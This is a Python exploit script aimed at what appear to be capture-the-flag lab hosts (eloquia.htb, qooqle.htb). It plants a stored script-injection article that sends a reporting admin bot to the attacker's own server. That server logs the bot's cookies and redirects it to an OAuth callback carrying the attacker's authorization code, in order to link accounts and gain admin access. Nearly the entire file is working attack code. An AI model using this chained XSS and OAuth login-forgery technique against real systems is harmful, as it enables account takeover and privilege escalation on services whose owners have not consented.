#!/usr/bin/env python3
"""
Test two-stage redirect:
1. Article redirects to our server
2. Our server redirects to OAuth callback
This lets us see if bot follows redirect and what cookies it has.
"""
import requests
import threading
import time
import re
import os
import sys
import random
import subprocess
from http.server import HTTPServer, BaseHTTPRequestHandler
from io import BytesIO
from urllib.parse import urlparse, parse_qs, quote

TARGET_ELOQUIA = "http://eloquia.htb"
TARGET_QOOQLE = "http://qooqle.htb"
CLIENT_ID = "riQBUyAa4UZT3Y1z1HUf3LY7Idyu8zgWaBj4zHIi"
REDIRECT_URI = "http://eloquia.htb/accounts/oauth2/qooqle/callback/"

TMP_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tmp")
PORT = 8765

def get_csrf(html):
    match = re.search(r'csrfmiddlewaretoken" value="([^"]+)"', html)
    return match.group(1) if match else None

def load_credentials():
    with open(f'{TMP_DIR}/username.txt') as f:
        username = f.read().strip()
    with open(f'{TMP_DIR}/password.txt') as f:
        password = f.read().strip()
    return username, password

def create_banner_image():
    from PIL import Image
    img = Image.new('RGB', (200, 150))
    for i in range(200):
        for j in range(150):
            img.putpixel((i, j), (random.randint(0,255), random.randint(0,255), random.randint(0,255)))
    buf = BytesIO()
    img.save(buf, 'PNG')
    buf.seek(0)
    return buf

def get_tun0_ip():
    result = subprocess.run(['ip', 'addr', 'show', 'tun0'], capture_output=True, text=True)
    for line in result.stdout.split('\n'):
        if 'inet ' in line:
            return line.split()[1].split('/')[0]
    return None

# Global to store the OAuth code
oauth_code = None
callback_received = threading.Event()

class RedirectHandler(BaseHTTPRequestHandler):
    def log_message(self, *args): pass

    def handle(self):
        try:
            super().handle()
        except:
            pass

    def do_GET(self):
        global oauth_code

        print(f"\n{'='*60}")
        print(f"[STAGE 1] Bot reached our server!")
        print(f"  Path: {self.path}")
        print(f"  Client: {self.client_address}")

        # Check headers
        ua = self.headers.get('User-Agent', '')
        referer = self.headers.get('Referer', 'none')
        cookies = self.headers.get('Cookie', 'NONE')

        print(f"  User-Agent: {ua[:60]}...")
        print(f"  Referer: {referer}")
        print(f"  Cookies: {cookies}")

        is_bot = 'HeadlessChrome' in ua
        print(f"  Is Bot: {is_bot}")

        if is_bot and '/stage1' in self.path:
            callback_received.set()

            # Now redirect to the OAuth callback
            callback_url = f"{REDIRECT_URI}?code={oauth_code}"
            print(f"\n[STAGE 2] Redirecting to callback...")
            print(f"  Target: {callback_url}")

            self.send_response(302)
            self.send_header('Location', callback_url)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(f'<html><body>Redirecting to <a href="{callback_url}">callback</a></body></html>'.encode())
        else:
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(b'OK')

def main():
    global oauth_code

    username, password = load_credentials()
    callback_ip = get_tun0_ip()

    print(f"[*] User: {username}")
    print(f"[*] Callback IP: {callback_ip}")

    # Start redirect server
    print(f"[*] Starting redirect server on port {PORT}...")
    server = HTTPServer(('0.0.0.0', PORT), RedirectHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()

    # Login to both services
    print(f"[*] Logging into Eloquia...")
    eloquia = requests.Session()
    r = eloquia.get(f'{TARGET_ELOQUIA}/accounts/login/')
    csrf = get_csrf(r.text)
    eloquia.post(f'{TARGET_ELOQUIA}/accounts/login/',
        data={'csrfmiddlewaretoken': csrf, 'username': username, 'password': password},
        headers={'Referer': f'{TARGET_ELOQUIA}/accounts/login/'})

    print(f"[*] Logging into Qooqle...")
    qooqle = requests.Session()
    r = qooqle.get(f'{TARGET_QOOQLE}/login/')
    csrf = get_csrf(r.text)
    qooqle.post(f'{TARGET_QOOQLE}/login/',
        data={'csrfmiddlewaretoken': csrf, 'username': username, 'password': password},
        headers={'Referer': f'{TARGET_QOOQLE}/login/'})

    # Get OAuth code
    print(f"[*] Getting OAuth code...")
    auth_url = f'{TARGET_QOOQLE}/oauth2/authorize/?client_id={CLIENT_ID}&response_type=code&redirect_uri={REDIRECT_URI}'
    r = qooqle.get(auth_url)
    csrf = get_csrf(r.text)
    r = qooqle.post(auth_url,
        data={
            'csrfmiddlewaretoken': csrf,
            'redirect_uri': REDIRECT_URI,
            'scope': 'read write',
            'client_id': CLIENT_ID,
            'response_type': 'code',
            'allow': 'Authorize'
        },
        headers={'Referer': auth_url},
        allow_redirects=False)

    code_match = re.search(r'code=([^&\s]+)', r.headers.get('Location', ''))
    if not code_match:
        print("[-] Failed to get OAuth code")
        sys.exit(1)

    oauth_code = code_match.group(1)
    print(f"[+] OAuth code: {oauth_code[:20]}...")

    # Create article with redirect to our server
    timestamp = int(time.time())
    stage1_url = f"http://{callback_ip}:{PORT}/stage1?ts={timestamp}"

    # Try different redirect methods - JavaScript might preserve cookies better
    # Option 1: JavaScript redirect
    content = f'''<script>window.location.href="{stage1_url}";</script><p>Loading...</p>'''

    # Option 2: Auto-submitting form (uncomment to test)
    # content = f'''<form id="f" action="{stage1_url}" method="GET"></form><script>document.getElementById("f").submit();</script>'''

    print(f"\n[*] Creating article with two-stage redirect...")
    print(f"    Stage 1: {stage1_url}")
    print(f"    Stage 2: {REDIRECT_URI}?code=...")

    create_page = eloquia.get(f'{TARGET_ELOQUIA}/article/create/')
    csrf = get_csrf(create_page.text)

    my_articles = eloquia.get(f'{TARGET_ELOQUIA}/article/mine/')
    existing_ids = set(re.findall(r'article/visit/(\d+)', my_articles.text))

    r = eloquia.post(f'{TARGET_ELOQUIA}/article/create/',
        data={'csrfmiddlewaretoken': csrf, 'title': f'Test {timestamp}', 'content': content},
        files={'banner': ('banner.png', create_banner_image(), 'image/png')},
        headers={'Referer': f'{TARGET_ELOQUIA}/article/create/'},
        timeout=60)

    # Find article
    my_articles = eloquia.get(f'{TARGET_ELOQUIA}/article/mine/')
    new_ids = set(re.findall(r'article/visit/(\d+)', my_articles.text))
    created = new_ids - existing_ids
    article_id = max(created) if created else None

    if not article_id:
        print("[-] Failed to create article")
        sys.exit(1)

    print(f"[+] Article created: ID {article_id}")

    # Report it
    eloquia.get(f'{TARGET_ELOQUIA}/article/report/{article_id}/')
    print(f"[+] Article reported")

    # Wait for bot
    print(f"\n[*] Waiting for bot (up to 3 minutes)...")
    print(f"[*] Watch for Stage 1 callback...\n")

    for i in range(180):
        if callback_received.is_set():
            break
        print(f"\r    Waiting: {i}s  ", end='', flush=True)
        time.sleep(1)

    print()

    if callback_received.is_set():
        print(f"\n[+] Stage 1 callback received!")
        print(f"[*] Waiting 10s for callback to process...")
        time.sleep(10)

        # Now try OAuth login
        print(f"\n[*] Attempting OAuth login...")
        eloquia2 = requests.Session()
        r = eloquia2.get(f'{TARGET_ELOQUIA}/accounts/oauth2/qooqle/authorize/', allow_redirects=False)
        qooqle_url = r.headers.get('Location', '')

        r = qooqle.get(qooqle_url)
        csrf = get_csrf(r.text)
        if csrf:
            r = qooqle.post(qooqle_url,
                data={
                    'csrfmiddlewaretoken': csrf,
                    'redirect_uri': REDIRECT_URI,
                    'scope': 'read write',
                    'client_id': CLIENT_ID,
                    'response_type': 'code',
                    'allow': 'Authorize'
                },
                headers={'Referer': qooqle_url},
                allow_redirects=False)
            callback_url = r.headers.get('Location', '')
        else:
            callback_url = r.url if 'code=' in r.url else ''

        r = eloquia2.get(callback_url, allow_redirects=True)

        if 'sessionid' in eloquia2.cookies:
            r = eloquia2.get(f'{TARGET_ELOQUIA}/accounts/profile/')
            match = re.search(r'Howdy,\s*(\w+)', r.text)
            if match:
                logged_as = match.group(1)
                print(f"[*] Logged in as: {logged_as}")
                if 'admin' in logged_as.lower():
                    print(f"[+] SUCCESS! Got admin access!")
                else:
                    print(f"[-] Not admin - linking didn't work")
            else:
                print(f"[?] Got session but can't determine user")
        else:
            print(f"[-] No session obtained")
            print(f"    Response: {r.text[:200]}")
    else:
        print(f"[-] No callback received - bot didn't follow redirect")

    server.shutdown()

if __name__ == "__main__":
    main()
